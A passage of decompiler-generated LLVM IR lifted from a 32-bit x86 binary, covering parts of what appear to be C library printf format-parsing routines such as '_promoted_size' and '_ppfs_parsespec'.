  store i32 %v3_804ee62, i32* %edx.global-to-local, align 4
  %v1_804ee65 = add i32 %v3_804ee62, 8
  store i32 %v1_804ee65, i32* %eax.global-to-local, align 4
  store i32 %v1_804ee65, i32* %v2_804ee24, align 4
  %v0_804ee6b = load i32, i32* %edx.global-to-local, align 4
  %v1_804ee6b = inttoptr i32 %v0_804ee6b to double*
  %v2_804ee6b = load double, double* %v1_804ee6b, align 4
  %v2_804ee6d = load i32, i32* %ebx.global-to-local, align 4
  %v4_804ee6d = inttoptr i32 %v2_804ee6d to double*
  store double %v2_804ee6b, double* %v4_804ee6d, align 4
  br label %dec_label_pc_804ee8a

dec_label_pc_804ee71:                             ; preds = %dec_label_pc_804ee47
  %v3_804ee71 = load i32, i32* %v2_804ee24, align 4
  store i32 %v3_804ee71, i32* %edx.global-to-local, align 4
  %v1_804ee74 = add i32 %v3_804ee71, 12
  store i32 %v1_804ee74, i32* %eax.global-to-local, align 4
  store i32 %v1_804ee74, i32* %v2_804ee24, align 4
  %v0_804ee7a = load i32, i32* %edx.global-to-local, align 4
  %v1_804ee7a = inttoptr i32 %v0_804ee7a to x86_fp80*
  %v2_804ee7a = load x86_fp80, x86_fp80* %v1_804ee7a, align 4
  %v2_804ee7c = load i32, i32* %ebx.global-to-local, align 4
  %v3_804ee7c = inttoptr i32 %v2_804ee7c to x86_fp80*
  store x86_fp80 %v2_804ee7a, x86_fp80* %v3_804ee7c, align 4
  br label %dec_label_pc_804ee8a

dec_label_pc_804ee80:                             ; preds = %dec_label_pc_804ee29, %dec_label_pc_804ee37, %dec_label_pc_804ee47
  %v1_804ee80 = add i32 %v3_804ee24, 4
  store i32 %v1_804ee80, i32* %eax.global-to-local, align 4
  store i32 %v1_804ee80, i32* %v2_804ee24, align 4
  %v0_804ee86 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ee86 = inttoptr i32 %v0_804ee86 to i32*
  %v2_804ee86 = load i32, i32* %v1_804ee86, align 4
  store i32 %v2_804ee86, i32* %eax.global-to-local, align 4
  %v1_804ee88 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ee88 = inttoptr i32 %v1_804ee88 to i32*
  store i32 %v2_804ee86, i32* %v2_804ee88, align 4
  br label %dec_label_pc_804ee8a

dec_label_pc_804ee8a:                             ; preds = %dec_label_pc_804ee71, %dec_label_pc_804ee62, %dec_label_pc_804ee50, %dec_label_pc_804ee80
  %v0_804ee8a = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ee8a = add i32 %v0_804ee8a, 12
  store i32 %v1_804ee8a, i32* %ebx.global-to-local, align 4
  %v0_804ee8d.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804ee8e.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ee8d

dec_label_pc_804ee8d:                             ; preds = %dec_label_pc_804ee1b, %dec_label_pc_804ee8a
  %v1_804ee8e = phi i32 [ %v1_804ee8e22, %dec_label_pc_804ee1b ], [ %v1_804ee8e.pre, %dec_label_pc_804ee8a ]
  %v0_804ee8d = phi i32 [ %v1_804ee1b21, %dec_label_pc_804ee1b ], [ %v0_804ee8d.pre, %dec_label_pc_804ee8a ]
  %v1_804ee8d = add i32 %v0_804ee8d, 1
  store i32 %v1_804ee8d, i32* %esi.global-to-local, align 4
  %v2_804ee8e = add i32 %v1_804ee8e, 28
  %v3_804ee8e = inttoptr i32 %v2_804ee8e to i32*
  %v4_804ee8e = load i32, i32* %v3_804ee8e, align 4
  %v5_804ee91 = icmp slt i32 %v1_804ee8d, %v4_804ee8e
  br i1 %v5_804ee91, label %dec_label_pc_804ee1b, label %dec_label_pc_804ee8e.dec_label_pc_804eec3.loopexit_crit_edge

dec_label_pc_804ee95:                             ; preds = %entry
  br i1 %v1_804ee9c, label %dec_label_pc_804eeac, label %dec_label_pc_804ee9e

dec_label_pc_804ee9e:                             ; preds = %dec_label_pc_804ee95
  %v1_804ee9e = add i32 %arg1, 36
  %v2_804ee9e = inttoptr i32 %v1_804ee9e to i8*
  %v3_804ee9e = load i8, i8* %v2_804ee9e, align 1
  %v2_804eea2 = zext i8 %v3_804ee9e to i32
  %v3_804eea2 = mul nuw nsw i32 %v2_804eea2, 12
  store i32 %v3_804eea2, i32* %eax.global-to-local, align 4
  %v2_804eea5 = add i32 %arg1, 68
  %v3_804eea5 = add i32 %v2_804eea5, %v3_804eea2
  %v4_804eea5 = inttoptr i32 %v3_804eea5 to i32*
  %v5_804eea5 = load i32, i32* %v4_804eea5, align 4
  store i32 %v5_804eea5, i32* %eax.global-to-local, align 4
  store i32 %v5_804eea5, i32* %v2_804ee95, align 4
  %v0_804eeac.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804eeac

dec_label_pc_804eeac:                             ; preds = %dec_label_pc_804ee95, %dec_label_pc_804ee9e
  %v1_804eec0 = phi i32 [ %arg1, %dec_label_pc_804ee95 ], [ %v0_804eeac.pre, %dec_label_pc_804ee9e ]
  %v1_804eeac = add i32 %v1_804eec0, 4
  %v2_804eeac = inttoptr i32 %v1_804eeac to i32*
  %v3_804eeac = load i32, i32* %v2_804eeac, align 4
  %v8_804eeac = icmp eq i32 %v3_804eeac, -2147483648
  %v1_804eeb3 = icmp eq i1 %v8_804eeac, false
  br i1 %v1_804eeb3, label %dec_label_pc_804eec3, label %dec_label_pc_804eeb5

dec_label_pc_804eeb5:                             ; preds = %dec_label_pc_804eeac
  %v1_804eeb5 = add i32 %v1_804eec0, 37
  %v2_804eeb5 = inttoptr i32 %v1_804eeb5 to i8*
  %v3_804eeb5 = load i8, i8* %v2_804eeb5, align 1
  %v2_804eeb9 = zext i8 %v3_804eeb5 to i32
  %v3_804eeb9 = mul nuw nsw i32 %v2_804eeb9, 12
  store i32 %v3_804eeb9, i32* %eax.global-to-local, align 4
  %v1_804eebc = load i32, i32* %ebx.global-to-local, align 4
  %v2_804eebc = add nsw i32 %v3_804eeb9, -12
  %v3_804eebc = add i32 %v2_804eebc, %v1_804eebc
  %v4_804eebc = inttoptr i32 %v3_804eebc to i32*
  %v5_804eebc = load i32, i32* %v4_804eebc, align 4
  store i32 %v5_804eebc, i32* %eax.global-to-local, align 4
  store i32 %v5_804eebc, i32* %v2_804eeac, align 4
  %v0_804eec3.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804eec3

dec_label_pc_804ee8e.dec_label_pc_804eec3.loopexit_crit_edge: ; preds = %dec_label_pc_804ee8d
  br label %dec_label_pc_804eec3.loopexit

dec_label_pc_804eec3.loopexit:                    ; preds = %dec_label_pc_804ee8e.dec_label_pc_804eec3.loopexit_crit_edge, %dec_label_pc_804ee17
  %v1_804ee8e.lcssa = phi i32 [ %v1_804ee8e, %dec_label_pc_804ee8e.dec_label_pc_804eec3.loopexit_crit_edge ], [ %v1_804ee8e15, %dec_label_pc_804ee17 ]
  br label %dec_label_pc_804eec3

dec_label_pc_804eec3:                             ; preds = %dec_label_pc_804eec3.loopexit, %dec_label_pc_804eeac, %dec_label_pc_804eeb5
  %v10_804eeca = phi i32 [ %v1_804ee8e.lcssa, %dec_label_pc_804eec3.loopexit ], [ %v1_804eec0, %dec_label_pc_804eeac ], [ %v0_804eec3.pre, %dec_label_pc_804eeb5 ]
  %v1_804eec3 = add i32 %v10_804eeca, 8
  %v2_804eec3 = inttoptr i32 %v1_804eec3 to i32*
  %v3_804eec3 = load i32, i32* %v2_804eec3, align 4
  store i32 %v3_804eec3, i32* %eax.global-to-local, align 4
  %v2_804eec6 = icmp slt i32 %v3_804eec3, 0
  %v1_804eec8 = icmp eq i1 %v2_804eec6, false
  br i1 %v1_804eec8, label %dec_label_pc_804eede, label %dec_label_pc_804eeca

dec_label_pc_804eeca:                             ; preds = %dec_label_pc_804eec3
  %v1_804eeca = add i32 %v10_804eeca, 16
  %v2_804eeca = inttoptr i32 %v1_804eeca to i32*
  %v3_804eeca = load i32, i32* %v2_804eeca, align 4
  %v4_804eeca = or i32 %v3_804eeca, 8
  store i32 %v4_804eeca, i32* %v2_804eeca, align 4
  %v0_804eece = load i32, i32* %eax.global-to-local, align 4
  %v1_804eece = sub i32 0, %v0_804eece
  store i32 %v1_804eece, i32* %eax.global-to-local, align 4
  %v1_804eed0 = load i32, i32* @ecx, align 4
  %v2_804eed0 = add i32 %v1_804eed0, 8
  %v3_804eed0 = inttoptr i32 %v2_804eed0 to i32*
  store i32 %v1_804eece, i32* %v3_804eed0, align 4
  %v0_804eed3 = load i32, i32* @ecx, align 4
  %v1_804eed3 = add i32 %v0_804eed3, 16
  %v2_804eed3 = inttoptr i32 %v1_804eed3 to i32*
  %v3_804eed3 = load i32, i32* %v2_804eed3, align 4
  %v4_804eed3 = and i32 %v3_804eed3, -2
  store i32 %v4_804eed3, i32* %v2_804eed3, align 4
  %v0_804eed7 = load i32, i32* @ecx, align 4
  %v1_804eed7 = add i32 %v0_804eed7, 20
  %v2_804eed7 = inttoptr i32 %v1_804eed7 to i32*
  store i32 32, i32* %v2_804eed7, align 4
  %v0_804eee0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eede

dec_label_pc_804eede:                             ; preds = %dec_label_pc_804eec3, %dec_label_pc_804eeca
  %v0_804eee0 = phi i32 [ %v3_804eec3, %dec_label_pc_804eec3 ], [ %v0_804eee0.pre, %dec_label_pc_804eeca ]
  %v2_804eede = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804eede, i32* @ebx, align 4
  ret i32 %v0_804eee0

; uselistorder directives
  uselistorder i32 %v3_804eeb9, { 1, 0 }
  uselistorder i32 %v3_804eea2, { 1, 0 }
  uselistorder i32 %v1_804ee8d, { 2, 1, 0 }
  uselistorder i32 %v1_804ee8e, { 1, 2, 0 }
  uselistorder i32 %v3_804ee24, { 1, 0, 2 }
  uselistorder i32* %v2_804ee24, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804ee1f, { 1, 0 }
  uselistorder i32 %v6_804ee1b, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804ee1b21, { 1, 0 }
  uselistorder i32 %v1_804ee8e15, { 2, 0, 1 }
  uselistorder i1 %v1_804ee9c, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_804eede, { 1, 0 }
  uselistorder label %dec_label_pc_804eec3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804eeac, { 1, 0 }
  uselistorder label %dec_label_pc_804ee8d, { 1, 0 }
  uselistorder label %dec_label_pc_804ee8a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ee80, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ee1b, { 1, 0 }
  uselistorder label %dec_label_pc_804ee17, { 1, 0 }
  uselistorder label %dec_label_pc_804edfd, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804eee4 = load i32, i32* @eax, align 4
  br label %dec_label_pc_804eeeb

dec_label_pc_804eeeb:                             ; preds = %dec_label_pc_804eeeb, %entry
  %v0_804eeeb = phi i32 [ ptrtoint (i8** @global_var_805740a.168 to i32), %entry ], [ %v1_804eeeb, %dec_label_pc_804eeeb ]
  %v1_804eeeb = add i32 %v0_804eeeb, -2
  %v1_804eeee = inttoptr i32 %v1_804eeeb to i16*
  %v2_804eeee = load i16, i16* %v1_804eeee, align 2
  %v3_804eeee = sext i16 %v2_804eeee to i32
  %v12_804eef1 = icmp ne i32 %v3_804eeee, %v0_804eee4
  %v6_804eefb = icmp ugt i32 %v1_804eeeb, ptrtoint (i32* @global_var_80573f2.169 to i32)
  %or.cond = and i1 %v6_804eefb, %v12_804eef1
  br i1 %or.cond, label %dec_label_pc_804eeeb, label %dec_label_pc_804eefd

dec_label_pc_804eefd:                             ; preds = %dec_label_pc_804eeeb
  %.pre = add i32 %v0_804eeeb, -134575092
  %v2_804ef03 = sdiv i32 %.pre, 2
  store i32 %v2_804ef03, i32* @edx, align 4
  %v1_804ef05 = add i32 %v2_804ef03, ptrtoint (i8** @global_var_805740a.168 to i32)
  %v2_804ef05 = inttoptr i32 %v1_804ef05 to i8*
  %v3_804ef05 = load i8, i8* %v2_804ef05, align 1
  %v4_804ef05 = zext i8 %v3_804ef05 to i32
  ret i32 %v4_804ef05

; uselistorder directives
  uselistorder i32 %v2_804ef03, { 1, 0 }
  uselistorder i32 %v1_804eeeb, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805740a.168 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ef0e = load i32, i32* @edi, align 4
  %v0_804ef0f = load i32, i32* @esi, align 4
  %v0_804ef10 = load i32, i32* @ebx, align 4
  store i32 %v0_804ef10, i32* %stack_var_-16, align 4
  %v4_804ef10 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804ef3c = add i32 %tmp76, 24
  %v2_804ef3c = inttoptr i32 %v1_804ef3c to i32*
  %v3_804ef3c = load i32, i32* %v2_804ef3c, align 4
  store i32 %v3_804ef3c, i32* %eax.global-to-local, align 4
  %v1_804ef43 = add i32 %tmp76, 16
  %v2_804ef43 = inttoptr i32 %v1_804ef43 to i32*
  %v3_804ef43 = load i32, i32* %v2_804ef43, align 4
  %v1_804ef46 = and i32 %v3_804ef43, 128
  %v2_804ef46 = icmp eq i32 %v1_804ef46, 0
  store i32 %v1_804ef46, i32* %edi.global-to-local, align 4
  %v1_804ef4c = icmp eq i1 %v2_804ef46, false
  br i1 %v1_804ef4c, label %dec_label_pc_804ef5f, label %dec_label_pc_804ef4e

dec_label_pc_804ef4e:                             ; preds = %entry
  %v2_804ef4e = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804efac.outer

dec_label_pc_804ef59:                             ; preds = %dec_label_pc_804f0e7
  %v1_804ef59 = add i32 %v0_804f0e7.pre.pre, 1
  store i32 %v1_804ef59, i32* @esi, align 4
  br label %dec_label_pc_804f0f7

dec_label_pc_804ef5f:                             ; preds = %entry
  %v15_804ef11 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ef61

dec_label_pc_804ef61:                             ; preds = %dec_label_pc_804ef89.dec_label_pc_804ef61_crit_edge, %dec_label_pc_804ef5f
  %v2_804ef72 = phi i32 [ %v2_804ef72.pre, %dec_label_pc_804ef89.dec_label_pc_804ef61_crit_edge ], [ %v15_804ef11, %dec_label_pc_804ef5f ]
  %v3_804ef72 = phi i32 [ %v1_804ef89, %dec_label_pc_804ef89.dec_label_pc_804ef61_crit_edge ], [ 0, %dec_label_pc_804ef5f ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804ef65 = mul i32 %v3_804ef72, 4
  store i32 %v1_804ef65, i32* @ecx, align 4
  %v2_804ef6c = load i32, i32* %arg1, align 4
  store i32 %v2_804ef6c, i32* @edx, align 4
  %v2_804ef6e = add i32 %v1_804ef65, -4
  %v3_804ef6e = add i32 %v2_804ef6e, %v2_804ef6c
  %v4_804ef6e = inttoptr i32 %v3_804ef6e to i32*
  %v5_804ef6e = load i32, i32* %v4_804ef6e, align 4
  store i32 %v5_804ef6e, i32* %eax.global-to-local, align 4
  %v1_804ef72 = trunc i32 %v5_804ef6e to i8
  %v4_804ef72 = add i32 %v2_804ef72, 36
  %v5_804ef72 = add i32 %v4_804ef72, %v3_804ef72
  %v6_804ef72 = inttoptr i32 %v5_804ef72 to i8*
  store i8 %v1_804ef72, i8* %v6_804ef72, align 1
  %v0_804ef76 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ef76 = urem i32 %v0_804ef76, 256
  %v2_804ef76 = load i32, i32* @ebx, align 4
  %v3_804ef76 = and i32 %v2_804ef76, -256
  %v4_804ef76 = or i32 %v3_804ef76, %v1_804ef76
  store i32 %v4_804ef76, i32* @ebx, align 4
  %v1_804ef78 = mul i32 %v0_804ef76, 16777216
  %v2_804ef78 = sdiv i32 %v1_804ef78, 16777216
  store i32 %v2_804ef78, i32* %eax.global-to-local, align 4
  %v1_804ef7b = load i32, i32* @edx, align 4
  %v2_804ef7b = load i32, i32* @ecx, align 4
  %v3_804ef7b = add i32 %v1_804ef7b, -4
  %v4_804ef7b = add i32 %v3_804ef7b, %v2_804ef7b
  %v5_804ef7b = inttoptr i32 %v4_804ef7b to i32*
  %v6_804ef7b = load i32, i32* %v5_804ef7b, align 4
  %v17_804ef7b = icmp eq i32 %v2_804ef78, %v6_804ef7b
  %v1_804ef7f = icmp eq i1 %v17_804ef7b, false
  br i1 %v1_804ef7f, label %dec_label_pc_804f2d1, label %dec_label_pc_804ef85

dec_label_pc_804ef85:                             ; preds = %dec_label_pc_804ef61
  %v3_804ef85 = trunc i32 %v0_804ef76 to i8
  %v4_804ef85 = icmp eq i8 %v3_804ef85, 0
  br i1 %v4_804ef85, label %dec_label_pc_804ef8f, label %dec_label_pc_804ef89

dec_label_pc_804ef89:                             ; preds = %dec_label_pc_804ef85
  %v0_804ef89 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ef89 = add i32 %v0_804ef89, 1
  store i32 %v1_804ef89, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804ef89, 32
  br i1 %tmp, label %dec_label_pc_804ef89.dec_label_pc_804ef61_crit_edge, label %dec_label_pc_804ef8f

dec_label_pc_804ef89.dec_label_pc_804ef61_crit_edge: ; preds = %dec_label_pc_804ef89
  %v2_804ef72.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ef61

dec_label_pc_804ef8f:                             ; preds = %dec_label_pc_804ef89, %dec_label_pc_804ef85
  %v2_804ef94 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804efac.outer

dec_label_pc_804efac.outer:                       ; preds = %dec_label_pc_804ef8f, %dec_label_pc_804ef4e, %dec_label_pc_804f0c9
  %v0_804efb8.ph94 = phi i32 [ %v1_804f0c9, %dec_label_pc_804f0c9 ], [ %v2_804ef4e, %dec_label_pc_804ef4e ], [ %v2_804ef94, %dec_label_pc_804ef8f ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804f0c9 ], [ %tmp66, %dec_label_pc_804ef4e ], [ %tmp66, %dec_label_pc_804ef8f ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804ef52, %dec_label_pc_804f0c9 ], [ 0, %dec_label_pc_804ef4e ], [ 0, %dec_label_pc_804ef8f ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804f0c9 ], [ %v3_804ef3c, %dec_label_pc_804ef4e ], [ %v3_804ef3c, %dec_label_pc_804ef8f ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804f0c9 ], [ 0, %dec_label_pc_804ef4e ], [ 0, %dec_label_pc_804ef8f ]
  %v7_804efb3 = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804efb3 = trunc i64 %v7_804efb3 to i32
  %v2_804efbb = add i32 %v8_804efb3, 80
  br label %dec_label_pc_804efac

dec_label_pc_804efac:                             ; preds = %dec_label_pc_804efac.outer, %dec_label_pc_804f069
  %v0_804efb8 = phi i32 [ %v0_804f076, %dec_label_pc_804f069 ], [ %v0_804efb8.ph94, %dec_label_pc_804efac.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804f069 ], [ %stack_var_-32.1.ph, %dec_label_pc_804efac.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804f069 ], [ %stack_var_-88.1.ph, %dec_label_pc_804efac.outer ]
  store i32 %v0_804efb8, i32* @edx, align 4
  %v1_804efac = inttoptr i32 %v0_804efb8 to i8*
  %v2_804efac = load i8, i8* %v1_804efac, align 1
  %v11_804efac = icmp eq i8 %v2_804efac, 42
  store i32 %v0_804efb8, i32* @esi, align 4
  %v1_804efb1 = icmp eq i1 %v11_804efac, false
  br i1 %v1_804efb1, label %dec_label_pc_804efc3, label %dec_label_pc_804efb3

dec_label_pc_804efb3:                             ; preds = %dec_label_pc_804efac
  store i32 %v8_804efb3, i32* %eax.global-to-local, align 4
  %v1_804efb8 = add i32 %v0_804efb8, 1
  store i32 %v1_804efb8, i32* @esi, align 4
  %v0_804efbb = load i32, i32* @esp, align 4
  %v3_804efbb = add i32 %v2_804efbb, %v0_804efbb
  %v4_804efbb = inttoptr i32 %v3_804efbb to i32*
  store i32 0, i32* %v4_804efbb, align 4
  %v0_804efdd.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804efc3

dec_label_pc_804efc3:                             ; preds = %dec_label_pc_804efac, %dec_label_pc_804efb3
  %v0_804efdd.pre = phi i32 [ %v0_804efb8, %dec_label_pc_804efac ], [ %v0_804efdd.pre.pre, %dec_label_pc_804efb3 ]
  %v0_804efc3 = load i32, i32* @global_var_8059dd8, align 8
  store i32 %v0_804efc3, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_804efdd.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804efdd

dec_label_pc_804efcd:                             ; preds = %dec_label_pc_804efdd
  %v1_804efcd = add i32 %v1_804efd5, -4094
  %v6_804efcd = sub i32 4093, %v1_804efd5
  %v7_804efcd = and i32 %v6_804efcd, %v1_804efd5
  %v8_804efcd = icmp slt i32 %v7_804efcd, 0
  %v9_804efcd = icmp eq i32 %v1_804efcd, 0
  %v10_804efcd = icmp slt i32 %v1_804efcd, 0
  %v3_804efd3 = icmp eq i1 %v10_804efcd, %v8_804efcd
  %v4_804efd3 = icmp eq i1 %v9_804efcd, false
  %v5_804efd3 = and i1 %v4_804efd3, %v3_804efd3
  br i1 %v5_804efd3, label %dec_label_pc_804efdc, label %dec_label_pc_804efd5

dec_label_pc_804efd5:                             ; preds = %dec_label_pc_804efcd
  %v3_804efd5 = mul i32 %v1_804efd5, 10
  store i32 %v3_804efd5, i32* %eax.global-to-local, align 4
  %v2_804efd8 = add i32 %v3_804efd5, -48
  %v3_804efd8 = add i32 %v2_804efd8, %v2_804efdf
  store i32 %v3_804efd8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804efdc

dec_label_pc_804efdc:                             ; preds = %dec_label_pc_804efcd, %dec_label_pc_804efd5
  %v0_804eff732 = phi i32 [ %v1_804efd5, %dec_label_pc_804efcd ], [ %v3_804efd8, %dec_label_pc_804efd5 ]
  %v4_804efdd28 = phi i32 [ %v6_804efdd, %dec_label_pc_804efcd ], [ %v3_804efd5, %dec_label_pc_804efd5 ]
  %v1_804efdc = add i32 %v0_804efdc, 1
  store i32 %v1_804efdc, i32* @esi, align 4
  br label %dec_label_pc_804efdd

dec_label_pc_804efdd:                             ; preds = %dec_label_pc_804efc3, %dec_label_pc_804efdc
  %v1_804efd5 = phi i32 [ 0, %dec_label_pc_804efc3 ], [ %v0_804eff732, %dec_label_pc_804efdc ]
  %v4_804efdd = phi i32 [ %v4_804efdd.pre, %dec_label_pc_804efc3 ], [ %v4_804efdd28, %dec_label_pc_804efdc ]
  %v0_804efdc = phi i32 [ %v0_804efdd.pre, %dec_label_pc_804efc3 ], [ %v1_804efdc, %dec_label_pc_804efdc ]
  %v1_804efdd = inttoptr i32 %v0_804efdc to i8*
  %v2_804efdd = load i8, i8* %v1_804efdd, align 1
  %v3_804efdd = zext i8 %v2_804efdd to i32
  %v5_804efdd = and i32 %v4_804efdd, -256
  %v6_804efdd = or i32 %v3_804efdd, %v5_804efdd
  store i32 %v6_804efdd, i32* %eax.global-to-local, align 4
  %v2_804efdf = sext i8 %v2_804efdd to i32
  store i32 %v2_804efdf, i32* @ecx, align 4
  %v2_804efe2 = mul nsw i32 %v2_804efdf, 2
  %v3_804efe2 = add i32 %v2_804efe2, %v0_804efc3
  %v4_804efe2 = inttoptr i32 %v3_804efe2 to i8*
  %v5_804efe2 = load i8, i8* %v4_804efe2, align 1
  %v6_804efe2 = and i8 %v5_804efe2, 8
  %v7_804efe2 = icmp eq i8 %v6_804efe2, 0
  %v1_804efe7 = icmp eq i1 %v7_804efe2, false
  br i1 %v1_804efe7, label %dec_label_pc_804efcd, label %dec_label_pc_804efe9

dec_label_pc_804efe9:                             ; preds = %dec_label_pc_804efdd
  %v0_804efe9 = load i32, i32* @edx, align 4
  %v1_804efe9 = add i32 %v0_804efe9, -1
  %v2_804efe9 = inttoptr i32 %v1_804efe9 to i8*
  %v3_804efe9 = load i8, i8* %v2_804efe9, align 1
  %v12_804efe9 = icmp eq i8 %v3_804efe9, 37
  %v1_804efed = icmp eq i1 %v12_804efe9, false
  br i1 %v1_804efed, label %dec_label_pc_804f080, label %dec_label_pc_804eff3

dec_label_pc_804eff3:                             ; preds = %dec_label_pc_804efe9
  %v10_804eff3 = icmp eq i8 %v2_804efdd, 36
  %v1_804eff5 = icmp eq i1 %v10_804eff3, false
  br i1 %v1_804eff5, label %dec_label_pc_804f027, label %dec_label_pc_804eff7

dec_label_pc_804eff7:                             ; preds = %dec_label_pc_804eff3
  %tmp89 = icmp slt i32 %v1_804efd5, 1
  br i1 %tmp89, label %dec_label_pc_804f027, label %dec_label_pc_804effb

dec_label_pc_804effb:                             ; preds = %dec_label_pc_804eff7
  %v4_804effb = icmp eq i32 %stack_var_-88.1, 0
  %v1_804f000 = add i32 %v0_804efdc, 1
  store i32 %v1_804f000, i32* @edx, align 4
  br i1 %v4_804effb, label %dec_label_pc_804f2d1, label %dec_label_pc_804f009

dec_label_pc_804f009:                             ; preds = %dec_label_pc_804effb
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804f011 = sub i32 %v1_804efd5, %stack_var_-88.1
  %v8_804f011 = xor i32 %v1_804efd5, %stack_var_-88.1
  %v9_804f011 = xor i32 %v2_804f011, %v1_804efd5
  %v10_804f011 = and i32 %v9_804f011, %v8_804f011
  %v11_804f011 = icmp slt i32 %v10_804f011, 0
  %v12_804f011 = icmp eq i32 %v2_804f011, 0
  %v13_804f011 = icmp slt i32 %v2_804f011, 0
  %v3_804f013 = icmp ne i1 %v13_804f011, %v11_804f011
  %v4_804f013 = or i1 %v12_804f011, %v3_804f013
  %stack_var_-88.1.v0_804f015 = select i1 %v4_804f013, i32 %stack_var_-88.1, i32 %v1_804efd5
  br label %dec_label_pc_804f023

dec_label_pc_804f023:                             ; preds = %dec_label_pc_804f037, %dec_label_pc_804f009, %dec_label_pc_804f03b
  %v0_804f023 = phi i32 [ %v1_804f000, %dec_label_pc_804f009 ], [ %v0_804efe9, %dec_label_pc_804f03b ], [ %v0_804efe9, %dec_label_pc_804f037 ]
  %stack_var_-32.2 = phi i32 [ %v1_804efd5, %dec_label_pc_804f009 ], [ %stack_var_-32.1, %dec_label_pc_804f03b ], [ %stack_var_-32.1, %dec_label_pc_804f037 ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804f015, %dec_label_pc_804f009 ], [ 0, %dec_label_pc_804f03b ], [ 0, %dec_label_pc_804f037 ]
  store i32 %v0_804f023, i32* @esi, align 4
  br label %dec_label_pc_804f04a

dec_label_pc_804f027:                             ; preds = %dec_label_pc_804eff7, %dec_label_pc_804eff3
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804f037, label %dec_label_pc_804f02e

dec_label_pc_804f02e:                             ; preds = %dec_label_pc_804f027
  %v10_804f02e = icmp eq i8 %v2_804efdd, 109
  br i1 %v10_804f02e, label %dec_label_pc_804f080, label %dec_label_pc_804f2d1

dec_label_pc_804f037:                             ; preds = %dec_label_pc_804f027
  %tmp153 = icmp ugt i32 %v0_804efdc, %v0_804efe9
  br i1 %tmp153, label %dec_label_pc_804f03b, label %dec_label_pc_804f023

dec_label_pc_804f03b:                             ; preds = %dec_label_pc_804f037
  %v1_804f03b = inttoptr i32 %v0_804efe9 to i8*
  %v2_804f03b = load i8, i8* %v1_804f03b, align 1
  %v8_804f03b = icmp eq i8 %v2_804f03b, 48
  br i1 %v8_804f03b, label %dec_label_pc_804f023, label %dec_label_pc_804f080

dec_label_pc_804f04a:                             ; preds = %dec_label_pc_804f05b, %dec_label_pc_804f023
  %v0_804f076 = phi i32 [ %v1_804f05b, %dec_label_pc_804f05b ], [ %v0_804f023, %dec_label_pc_804f023 ]
  %v4_804f05435 = phi i32 [ %v6_804f054, %dec_label_pc_804f05b ], [ %v6_804efdd, %dec_label_pc_804f023 ]
  store i32 ptrtoint ([8 x i8]* @global_var_80573ea.170 to i32), i32* %edx.global-to-local, align 4
  %v1_804f057 = inttoptr i32 %v0_804f076 to i8*
  br label %dec_label_pc_804f054

dec_label_pc_804f054:                             ; preds = %dec_label_pc_804f065, %dec_label_pc_804f04a
